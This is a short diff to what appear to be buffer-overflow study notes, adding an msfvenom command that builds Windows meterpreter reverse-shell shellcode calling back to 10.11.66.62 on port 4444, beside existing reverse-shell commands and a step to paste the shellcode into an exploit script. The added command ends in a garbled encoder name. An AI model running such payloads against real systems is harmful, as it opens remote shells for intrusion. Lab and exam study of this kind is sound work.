@@ -162,6 +162,8 @@ $ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread
 
 With encoding
 $ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<all bad chars>" -f c x86/shikata_ga_nai
+
+$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.66.62 LPORT=4444 EXITFUNC=thread -b "\x00" -f c x86/shikata_ga_nai6
 ```
 
 Copy generated C string without semicolon to exploit.py under payload
